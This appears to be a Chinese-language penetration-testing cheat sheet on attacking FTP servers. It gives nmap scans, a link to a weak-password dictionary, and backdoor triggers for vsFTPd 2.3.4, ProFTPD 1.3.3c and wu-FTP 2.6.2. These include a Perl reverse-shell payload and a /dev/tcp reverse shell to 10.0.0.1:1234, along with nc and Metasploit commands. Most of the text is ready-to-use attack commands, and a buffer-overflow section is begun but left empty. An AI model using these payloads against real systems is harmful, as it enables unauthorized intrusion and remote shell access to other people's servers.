# FTP服务

## 弱口令

自动化匿名扫描
```bash
nmap --script ftp-* -p 21 IP地址
```

弱口令字典

[FTP弱口令](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%9B%9B%E7%AB%A0/FTP/%E5%BC%B1%E5%8F%A3%E4%BB%A4.txt)

## FTP后门

1.vsFTPd 2.3.4

user = msfadmin:)

pass = 任意

```bash
nc [IP地址] 6200
```

使用Metasploit
```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

2.ProFTPD 1.3.3c

向FTP服务器发送以下命令
```bash
SITE CPFR /etc/lib/tmp/<shell_code>
```

替换shell_code为想要在目标上执行的shell代码，如建立反向shell
```bash
SITE CPFR /etc/lib/tmp/`perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,pack("ScA*",2,inet_aton($i),$p))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
```

这将执行一个Perl脚本，建立与10.0.0.1:1234的反向shell连接

发送命令执行shell代码
```bash
SITE CPWD /etc/lib/tmp
```

3.wu-FTP 2.6.2

向FTP服务器发送以下命令触发后门
```bash
DEBUG
```

发送以下命令来执行shell
```bash
SITE exec <command>
```

生成反向shell
```bash
SITE exec /bin/sh -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

## 缓冲区溢出
